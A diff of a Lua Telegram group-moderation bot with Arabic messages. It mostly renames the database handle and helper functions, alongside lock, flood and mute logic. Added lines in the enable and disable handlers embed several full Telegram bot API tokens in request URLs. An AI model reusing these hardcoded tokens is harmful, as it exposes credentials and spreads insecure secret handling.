-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
-if database:get("lock_en.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_en.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.entities_ then
 if msg.content_.entities_[0] then
 if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then
-if database:get("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_mark.note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 HTTPS.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false") 
-database:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'res:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("(.*)") then
-if database:get("lock_word:MohaMeD"..msg.chat_id_..bot_id) then 
-local MohaMeD_wr = (database:get("MohaMeD:not:word:"..bot_id..msg.chat_id_) or 100)
+if datahmade:get("lock_word:MohaMeD"..msg.chat_id_..bot_id) then 
+local MohaMeD_wr = (datahmade:get("MohaMeD:not:word:"..bot_id..msg.chat_id_) or 100)
 if #text >= tonumber(MohaMeD_wr) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
@@ -1908,7 +1754,7 @@ end
 end
 ------------------------------------------------------------------------
 if text and (text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]")  or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match(".[Ii][Rr]") or text and text:match(".[Cc][Oo][Mm]") or text and text:match(".[Oo][Rr][Gg]") or text and text:match(".[Ii][Nn][Ff][Oo]") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Tt][Kk]")) then
-if database:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
@@ -1917,7 +1763,7 @@ end
 if msg.content_.caption_ then
 local text = msg.content_.caption_
 if text and (text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match(".[Ii][Rr]") or text and text:match(".[Cc][Oo][Mm]") or text and text:match(".[Oo][Rr][Gg]") or text and text:match(".[Ii][Nn][Ff][Oo]") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Tt][Kk]")) then
-if database:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_link:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
@@ -1927,7 +1773,7 @@ end
 if msg.content_.caption_ then
 local text = msg.content_.caption_
 if text and text:match("(.*)(@)(.*)")  then
-if database:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
@@ -1935,40 +1781,40 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("(.*)(@)(.*)")  then
-if database:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_username:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
-if database:get("lock_chat:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_chat:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 ------------------------------------------------------------------------
 if text and text:match("(.*)(/)(.*)")  then
-if database:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("(.*)(#)(.*)")  then
-if database:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_tag:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.reply_to_message_id_ ~= 0 then
-if database:get("lock_reple:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_reple:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if  msg.content_.ID == "MessageChatJoinByLink" then
-if database:get("lock_join:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_join:MohaMeD"..msg.chat_id_..bot_id) then
 changeChatMemberStatus(msg.chat_id_, msg.sender_user_id_, "Kicked")
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
@@ -1977,10 +1823,10 @@ end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageChatAddMembers" then
 if msg.content_.members_[0].type_.ID == 'UserTypeBot' then
-if database:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id) and not bot_id then
+if datahmade:get("lock_bot:MohaMeD"..msg.chat_id_..bot_id) and not bot_id then
 changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
 end
-if database:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_botAndBan:MohaMeD"..msg.chat_id_..bot_id) then
 local function cb(extra,result,success)
 local bots = result.members_
 for i=0 , #bots do
@@ -1995,7 +1841,7 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("(.*)(#)(.*)")  then
-if database:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_sarha:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
@@ -2003,7 +1849,7 @@ end
 ------------------------------------------------------------------------
 if msg.forward_info_ then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
-if database:get("lock_fwd:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_fwd:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
@@ -2011,84 +1857,84 @@ end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageSticker" or msg.content_.ID == "MessageUnsupported" then
-if database:get("lock_stecker:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_stecker:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then
-if database:get("lock_new:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_new:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageUnsupported" then
-if database:get("lock_note:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_note:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessagePhoto" then
-if database:get("lock_photo:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_photo:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageAudio" then
-if database:get("lock_audeo:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_audeo:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageVoice" then
-if database:get("lock_voice:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_voice:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageVideo" then
-if database:get("lock_video:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_video:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageAnimation" then
-if database:get("lock_gif:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_gif:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageContact" then
-if database:get("lock_contact:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_contact:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("[\216-\219][\128-\191]") then
-if database:get("lock_ar:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_ar:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if msg.content_.ID == "MessageDocument" then
-if database:get("lock_files:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_files:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
 end
 ------------------------------------------------------------------------
 if text and text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
-if database:get("lock_en:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_en:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
@@ -2097,7 +1943,7 @@ end
 if msg.content_.entities_ then
 if msg.content_.entities_[0] then
 if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then
-if database:get("lock_mark:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_mark:MohaMeD"..msg.chat_id_..bot_id) then
 delete_msg(msg.chat_id_,{[0] = msg.id_})
 return false
 end
@@ -2106,33 +1952,33 @@ end
 end
 end -- end if not is_vip(msg) then
 if msg.content_.ID == "MessageChatAddMembers" then
-database:incr('MohaMeD:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
+datahmade:incr('MohaMeD:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
 if not is_vip(msg) then
-if database:get("lock_join:MohaMeD"..msg.chat_id_..bot_id) then
+if datahmade:get("lock_join:MohaMeD"..msg.chat_id_..bot_id) then
 changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, "Kicked")
 return false
 end
 end
 end
 ------------------------------------------------------------------------
-if database:get("lock_lllll:MohaMeD"..msg.chat_id_..bot_id)  and msg.content_.ID ~= "MessageChatAddMembers" then  
+if datahmade:get("lock_lllll:MohaMeD"..msg.chat_id_..bot_id) then
 local hash = 'flood:max:'..bot_id..msg.chat_id_
-if not database:get(hash) then
+if not datahmade:get(hash) then
 floodMax = 10
 else
-floodMax = tonumber(database:get(hash))
+floodMax = tonumber(datahmade:get(hash))
 end
 local hash = 'MohaMeD:'..bot_id..'flood:time:'..msg.chat_id_
-if not database:get(hash) then
+if not datahmade:get(hash) then
 floodTime = 1
 else
-floodTime = tonumber(database:get(hash))
+floodTime = tonumber(datahmade:get(hash))
 end
 if not is_vip(msg) and not is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) then
 if bot_id then
 if not is_vip(msg) and not is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) then
 local hash = 'flood:'..msg.sender_user_id_..':'..msg.chat_id_..':msg-num'
-local msgs = tonumber(database:get(hash) or 0)
+local msgs = tonumber(datahmade:get(hash) or 0)
 if msgs > (floodMax - 1) then
 local user = msg.sender_user_id_
 local chat = msg.chat_id_
@@ -2145,21 +1991,21 @@ local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 user_id = msg.sender_user_id_
-o = database:get("tsahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
+o = datahmade:get("tsahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
 if (o and (tonumber(o) >= 5)) then
-database:set("lock_media:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_word:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
-database:set('MohaMeD:'..bot_id..'get:photo'..msg.chat_id_,true)
+datahmade:set("lock_media:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_audeo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_video:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_photo:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_stecker:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_voice:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_gif:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_note:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_word:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_mark:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_link:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set("lock_new:MohaMeD"..msg.chat_id_..bot_id,"ok")
+datahmade:set('MohaMeD:'..bot_id..'get:photo'..msg.chat_id_,true)
 send(msg.chat_id_, 0, 1, '⚠️┇تم كشف عمليه تخريب في المجموعة \n‼️┇وتم قفل الميديا وسيتم طرد جميع الاشخاص الذين يقومون بعمل تكرار', 1, 'md')
 else
 send(msg.chat_id_, msg.id_, 1, '🎫┇الايدي ~⪼*('..msg.sender_user_id_..')* \n❕┇قمت بعمل تكرار للرسائل المحدده\n☑┇وتم كتمك في المجموعه\n', 1, 'md')
@@ -2179,11 +2025,11 @@ end
 if (o and (tonumber(o) > 5)) then
 chat_kick(msg.chat_id_, msg.sender_user_id_)
 end
-database:incr("tsahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
-database:sadd('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
+datahmade:incr("tsahke:spam:lock:"..os.date("%x")..bot_id..msg.chat_id_)
+datahmade:sadd('MohaMeD:'..bot_id..'muted:'..msg.chat_id_, msg.sender_user_id_)
 end
 end
-database:setex(hash, floodTime, msgs+1)
+datahmade:setex(hash, floodTime, msgs+1)
 end
 end
 end
@@ -2191,7 +2037,7 @@ end
 
 ------------------------------------------------------------------------
 if msg.content_.photo_ then
-local photo = database:get('MohaMeD:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
+local photo = datahmade:get('MohaMeD:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
 if photo then
 local idPh = nil
 if msg.content_.photo_.sizes_[0] then
@@ -2208,7 +2054,7 @@ idPh = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 end
 setphoto(msg.chat_id_, idPh)
 send(msg.chat_id_, msg.id_, 1, '🎴┇ تم وضع صوره للمجموعة ', 1, 'md')
-database:del('MohaMeD:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id..'setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
 return false
 end 
 end
@@ -2216,67 +2062,67 @@ end
 if msg.chat_id_ then
 local id = tostring(msg.chat_id_)
 if id:match('-100(%d+)') then
-if not database:sismember( 'MohaMeD:'..bot_id.."groups",msg.chat_id_) then
-database:sadd( 'MohaMeD:'..bot_id.."groups",msg.chat_id_)
+if not datahmade:sismember( 'MohaMeD:'..bot_id.."groups",msg.chat_id_) then
+datahmade:sadd( 'MohaMeD:'..bot_id.."groups",msg.chat_id_)
 end
 elseif id:match('^(%d+)') then
-database:sadd('MohaMeD:'..bot_id.."userss",msg.chat_id_)
+datahmade:sadd('MohaMeD:'..bot_id.."userss",msg.chat_id_)
 else
-if not database:sismember( 'MohaMeD:'..bot_id.."groups",msg.chat_id_) then
-database:sadd( 'MohaMeD:'..bot_id.."groups",msg.chat_id_)
+if not datahmade:sismember( 'MohaMeD:'..bot_id.."groups",msg.chat_id_) then
+datahmade:sadd( 'MohaMeD:'..bot_id.."groups",msg.chat_id_)
 end
 end
 end
-database:incr('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
+datahmade:incr('MohaMeD:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
 ------------------------------------------------------------------------
-if database:get('MohaMeD:'..bot_id..'viewget'..msg.sender_user_id_) then
+if datahmade:get('MohaMeD:'..bot_id..'viewget'..msg.sender_user_id_) then
 if not msg.forward_info_ then
 send(msg.chat_id_, msg.id_, 1, '❕┇قم بارسال المنشور من القناة', 1, 'md')
-database:del('MohaMeD:'..bot_id..'viewget'..msg.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id..'viewget'..msg.sender_user_id_)
 else
 send(msg.chat_id_, msg.id_, 1, '📊┇عدد المشاهدات ~⪼ <b>('..msg.views_..')</b> ', 1, 'html')
-database:del('MohaMeD:'..bot_id..'viewget'..msg.sender_user_id_)
+datahmade:del('MohaMeD:'..bot_id..'viewget'..msg.sender_user_id_)
 end
 end
 
 if (text == 'تعطيل') and not is_sudo(msg) then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function TSby(extra,result,success)
 info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'MohaMeDTEAM')..')\n'
-local keko2 = database:get("add"..bot_id)
-if keko2 then
-local keko = "https://api.telegram.org/bot" ..token.. '/getChatMember?chat_id=' .. msg.chat_id_ .. '&user_id='..msg.sender_user_id_
-local stats = https.request(keko)
+local ahmad2 = datahmade:get("add"..bot_id)
+if ahmad2 then
+local ahmad = "https://api.telegram.org/bot" ..token.. '/getChatMember?chat_id=' .. msg.chat_id_ .. '&user_id='..msg.sender_user_id_
+local stats = https.request(ahmad)
 local data = json:decode(stats)
 if (data.result and data.result.status == 'creator') then
-if not database:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
-function thsake_info(k1,k2)
+if not datahmade:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
+function MohaMeDe_info(k1,k2)
 send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} معطله سابقا", 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
+openChat(msg.chat_id_,MohaMeDe_info)
 end
-if database:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
-database:del( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
-function thsake_info(k1,k2)
+if datahmade:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
+datahmade:del( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
+function MohaMeDe_info(k1,k2)
 send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تعطيل المجموعه {"..k2.title_.."}", 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
-database:srem("thsake:gog"..bot_id, msg.chat_id_)
-database:del('MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
-function thsake_info2(k1,k2)
+openChat(msg.chat_id_,MohaMeDe_info)
+datahmade:srem("MohaMeDe:gog"..bot_id, msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id.."charge:"..msg.chat_id_)
+function MohaMeDe_info2(k1,k2)
 function dl_cb222(t1,t2)
-send(tostring((database:get("MohaMeD"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتعطيل مجموعه \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
+send(tostring((datahmade:get("MohaMeD"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتعطيل مجموعه \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
 end
 tdcli_function ({
 ID = "GetChannelFull",
 channel_id_ = getChatId(msg.chat_id_).ID
 }, dl_cb222, nil)
 end
-openChat(msg.chat_id_,thsake_info2) 
+openChat(msg.chat_id_,MohaMeDe_info2) 
 --
 end
 else
@@ -2289,38 +2135,38 @@ return false
 end
 ------------------------------------------------------------------------
 if (text == 'تفعيل') and not is_sudo(msg) then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function TSby(extra,result,success)
 info = '👤┇بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'MohaMeDTEAM')..')\n'
-local keko2 = database:get("add"..bot_id)
-if keko2 then
-local keko = "https://api.telegram.org/bot" ..token.. '/getChatMember?chat_id=' .. msg.chat_id_ .. '&user_id='..msg.sender_user_id_
-local stats = https.request(keko)
+local ahmad2 = datahmade:get("add"..bot_id)
+if ahmad2 then
+local ahmad = "https://api.telegram.org/bot" ..token.. '/getChatMember?chat_id=' .. msg.chat_id_ .. '&user_id='..msg.sender_user_id_
+local stats = https.request(ahmad)
 local data = json:decode(stats)
 if (data.result and data.result.can_promote_members or data.result.status == 'creator') then
-local keko = "https://api.telegram.org/bot" ..token.. '/getChatMembersCount?chat_id=' .. msg.chat_id_
-local stats = https.request(keko)
+local ahmad = "https://api.telegram.org/bot" ..token.. '/getChatMembersCount?chat_id=' .. msg.chat_id_
+local stats = https.request(ahmad)
 local data2 = json:decode(stats)
-local kekon = database:get("ts_a"..bot_id) or 1000
-if (data2.result and (tonumber(data2.result) == tonumber(kekon) or tonumber(data2.result) > tonumber(kekon))) then
-if database:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
-function thsake_info(k1,k2)
+local ahmadn = datahmade:get("ts_a"..bot_id) or 1000
+if (data2.result and (tonumber(data2.result) == tonumber(ahmadn) or tonumber(data2.result) > tonumber(ahmadn))) then
+if datahmade:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
+function MohaMeDe_info(k1,k2)
 send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} مفعله سابقا", 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
+openChat(msg.chat_id_,MohaMeDe_info)
 end
-if not database:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
-database:set( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_,true)
-function thsake_info(k1,k2)
+if not datahmade:get( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_) then
+datahmade:set( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_,true)
+function MohaMeDe_info(k1,k2)
 send(msg.chat_id_, msg.id_, 1, info.."✔️┇تم تفعيل المجموعه {"..(k2.title_ or "").."}", 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
-database:sadd("thsake:gog"..bot_id, msg.chat_id_)
-function thsake_info2(k1,k2)
+openChat(msg.chat_id_,MohaMeDe_info)
+datahmade:sadd("MohaMeDe:gog"..bot_id, msg.chat_id_)
